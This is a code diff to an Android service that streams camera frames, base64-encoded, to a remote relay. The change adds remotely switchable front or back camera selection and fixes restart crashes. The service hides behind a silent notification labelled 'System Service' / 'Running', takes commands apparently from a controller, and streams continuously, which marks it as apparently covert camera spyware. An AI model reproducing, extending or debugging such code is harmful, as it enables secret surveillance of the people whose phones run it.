@@ -17,7 +17,9 @@ import java.util.concurrent.atomic.AtomicLong
 class CameraStreamService : Service() {
 
     companion object {
-        var isRunning = false
+        var isRunning    = false
+        var currentFace  = "back"    // "front" or "back" — readable by CoreService for switch_camera
+        var currentInterval = 33L    // readable by CoreService for switch_camera
         private const val CHANNEL_ID = "cam_stream"
         private const val NOTIF_ID   = 11
     }
@@ -29,48 +31,77 @@ class CameraStreamService : Service() {
     private var imageReader: ImageReader? = null
     private var thread: HandlerThread? = null
     private var handler: Handler? = null
-    // 60fps = 16ms, 30fps = 33ms — minimum 16ms, default 33ms (30fps)
     private var intervalMs: Long = 33L
-    // Single background thread for encoding — avoids per-frame thread creation
+
+    // Single executor lives for the Service lifetime — never shut down mid-session.
+    // BUG FIX: Previously encodeExecutor.shutdown() was called in stopStream() which is called
+    // BEFORE startCamera() on a restart → RejectedExecutionException on encodeExecutor.execute().
     private val encodeExecutor = Executors.newSingleThreadExecutor()
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-        if (intent?.action == "STOP") { stopStream(); stopSelf(); return START_NOT_STICKY }
+        if (intent?.action == "STOP") {
+            cleanupCamera()
+            isRunning = false
+            stopSelf()
+            return START_NOT_STICKY
+        }
+        // BUG FIX: If called twice (e.g. switch_camera or double start), clean up old
+        // camera resources first. Without this, two sessions run simultaneously → crash.
+        cleanupCamera()
+
         createChannel()
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
             startForeground(NOTIF_ID, buildNotif(), ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA)
         } else {
             startForeground(NOTIF_ID, buildNotif())
         }
-        // 60fps = 16ms | 30fps = 33ms | 20fps = 50ms | minimum 16ms
-        intervalMs = (intent?.getLongExtra("interval", 33L) ?: 33L).coerceAtLeast(16L)
+
+        currentFace = intent?.getStringExtra("face") ?: "back"
+        currentInterval = (intent?.getLongExtra("interval", 33L) ?: 33L).coerceAtLeast(16L)
+        intervalMs = currentInterval
+
         isRunning = true
         streaming.set(true)
-        startCamera()
+        startCamera(useFront = (currentFace == "front"))
         return START_STICKY
     }
 
-    private fun startCamera() {
+    /** Clean up camera resources WITHOUT touching encodeExecutor — safe to call before restart. */
+    private fun cleanupCamera() {
+        streaming.set(false)
+        try { session?.stopRepeating() }  catch (_: Exception) {}
+        try { session?.close() }          catch (_: Exception) {}
+        try { cameraDevice?.close() }     catch (_: Exception) {}
+        try { imageReader?.close() }      catch (_: Exception) {}
+        try { thread?.quitSafely() }      catch (_: Exception) {}
+        session = null; cameraDevice = null; imageReader = null; thread = null; handler = null
+    }
+
+    private fun startCamera(useFront: Boolean) {
         thread = HandlerThread("CamStream", Process.THREAD_PRIORITY_URGENT_DISPLAY).apply { start() }
         handler = Handler(thread!!.looper)
 
         val mgr = getSystemService(CAMERA_SERVICE) as CameraManager
 
-        // BACK camera for monitoring (more reliable than front)
+        val wantedFacing = if (useFront)
+            CameraCharacteristics.LENS_FACING_FRONT
+        else
+            CameraCharacteristics.LENS_FACING_BACK
+
         val camId = mgr.cameraIdList.firstOrNull { id ->
             mgr.getCameraCharacteristics(id)
-                .get(CameraCharacteristics.LENS_FACING) == CameraCharacteristics.LENS_FACING_BACK
+                .get(CameraCharacteristics.LENS_FACING) == wantedFacing
         } ?: mgr.cameraIdList.firstOrNull() ?: return
 
-        val chars = mgr.getCameraCharacteristics(camId)
-        val map   = chars.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP) ?: return
+        val map = mgr.getCameraCharacteristics(camId)
+            .get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP) ?: return
         val sizes = map.getOutputSizes(ImageFormat.JPEG)
 
-        // Best balanced size: 480p range for low-lag but readable quality
+        // 480p sweet spot — low lag, readable quality, bandwidth manageable at 30fps
         val sorted = sizes.sortedBy { it.width * it.height }
         val size = sorted.firstOrNull { it.width >= 480 } ?: sorted.last()
 
-        // 5 buffers: GPU-rendered frames — prevents blocking when relay momentarily slow
+        // 5 buffers — prevents blocking when WebSocket relay is momentarily slow
         imageReader = ImageReader.newInstance(size.width, size.height, ImageFormat.JPEG, 5)
         imageReader!!.setOnImageAvailableListener({ reader ->
             val img = reader.acquireLatestImage() ?: return@setOnImageAvailableListener
@@ -79,18 +110,17 @@ class CameraStreamService : Service() {
                 if (now - lastSentAt.get() < intervalMs) { img.close(); return@setOnImageAvailableListener }
                 lastSentAt.set(now)
 
-                // Pull bytes off the Image immediately (before close)
                 val buf   = img.planes[0].buffer
                 val bytes = ByteArray(buf.remaining()).also { buf.get(it) }
                 img.close()
 
-                // Encode + send on dedicated thread — never blocks camera callback thread
                 val w = size.width; val h = size.height
                 encodeExecutor.execute {
                     try {
                         CoreService.instance?.sendData("camera_frame", JSONObject().apply {
                             put("frame", Base64.encodeToString(bytes, Base64.NO_WRAP))
                             put("w", w); put("h", h)
+                            put("face", if (useFront) "front" else "back")
                         })
                     } catch (_: Exception) {}
                 }
@@ -103,25 +133,20 @@ class CameraStreamService : Service() {
                     cameraDevice = cam
                     val req = cam.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW).apply {
                         addTarget(imageReader!!.surface)
-                        // VIDEO_RECORD intent: camera pipeline optimizes for throughput > latency
                         set(CaptureRequest.CONTROL_CAPTURE_INTENT, CaptureRequest.CONTROL_CAPTURE_INTENT_VIDEO_RECORD)
                         set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON)
-                        // BUG FIX: CONTINUOUS_VIDEO causes AF hunting lag (300-500ms focus oscillation).
-                        // AF_MODE_OFF with LENS_FOCUS_DISTANCE=0.0 (hyperfocal/infinity) is instant — no hunting.
+                        // AF_MODE_OFF with focus=0 (hyperfocal) = zero AF hunting lag
                         set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_OFF)
                         set(CaptureRequest.LENS_FOCUS_DISTANCE, 0.0f)
-                        // Disable OIS (adds latency)
-                        set(CaptureRequest.LENS_OPTICAL_STABILIZATION_MODE, CaptureRequest.LENS_OPTICAL_STABILIZATION_MODE_OFF)
+                        set(CaptureRequest.LENS_OPTICAL_STABILIZATION_MODE,
+                            CaptureRequest.LENS_OPTICAL_STABILIZATION_MODE_OFF)
                     }.build()
                     cam.createCaptureSession(listOf(imageReader!!.surface),
                         object : CameraCaptureSession.StateCallback() {
                             override fun onConfigured(s: CameraCaptureSession) {
                                 if (!streaming.get()) { s.close(); return }
                                 session = s
-                                try {
-                                    // setRepeatingRequest: camera sends frames as fast as possible
-                                    s.setRepeatingRequest(req, null, handler)
-                                } catch (_: Exception) {}
+                                try { s.setRepeatingRequest(req, null, handler) } catch (_: Exception) {}
                             }
                             override fun onConfigureFailed(s: CameraCaptureSession) { stopSelf() }
                         }, handler)
@@ -132,19 +157,7 @@ class CameraStreamService : Service() {
         } catch (_: SecurityException) { stopSelf() }
     }
 
-    private fun stopStream() {
-        streaming.set(false); isRunning = false
-        try { session?.stopRepeating() }  catch (_: Exception) {}
-        try { session?.close() }          catch (_: Exception) {}
-        try { cameraDevice?.close() }     catch (_: Exception) {}
-        try { imageReader?.close() }      catch (_: Exception) {}
-        thread?.quitSafely()
-        encodeExecutor.shutdown()
-    }
-
     private fun createChannel() {
-        // BUG FIX: IMPORTANCE_NONE rejected by Android 16 as invalid → service loses fg priority.
-        // IMPORTANCE_MIN = silent but valid on all Android versions.
         val ch = NotificationChannel(CHANNEL_ID, "Camera", NotificationManager.IMPORTANCE_MIN)
             .apply { setShowBadge(false); enableLights(false); enableVibration(false) }
         getSystemService(NotificationManager::class.java).createNotificationChannel(ch)
@@ -154,6 +167,11 @@ class CameraStreamService : Service() {
         .setContentTitle("System Service").setContentText("Running")
         .setSmallIcon(android.R.drawable.ic_menu_info_details).build()
 
-    override fun onDestroy() { stopStream(); super.onDestroy() }
+    override fun onDestroy() {
+        cleanupCamera()
+        isRunning = false
+        encodeExecutor.shutdown()
+        super.onDestroy()
+    }
     override fun onBind(intent: Intent?): IBinder? = null
 }
